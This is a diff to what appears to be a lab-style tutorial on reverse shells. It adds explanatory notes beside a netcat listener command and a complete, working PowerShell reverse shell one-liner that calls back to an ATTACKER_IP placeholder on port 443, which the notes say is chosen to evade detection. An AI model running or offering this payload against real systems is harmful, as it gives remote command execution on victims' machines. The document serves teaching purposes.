@@ -37,6 +37,7 @@ A **reverse shell** is when the **attacker starts a listener** and the **target 
 ```bash
 sudo nc -lvnp 443
 ```
+> Starts a listener on port 443 (HTTPS). Port 443 is used because most organizations allow outbound HTTPS traffic — using this port makes the shell connection blend in with normal web traffic.
 
 > Port 443 (HTTPS) is used because outbound 443 is almost never blocked. Using port 4444 or 9001 might get caught.
 
@@ -45,6 +46,7 @@ sudo nc -lvnp 443
 ```cmd
 powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 ```
+> PowerShell reverse shell one-liner. Replace `ATTACKER_IP` with your tun0 IP before running. `-nop` skips the PowerShell profile and `-c` runs the command string directly.
 
 **Breaking down the PowerShell one-liner:**
 
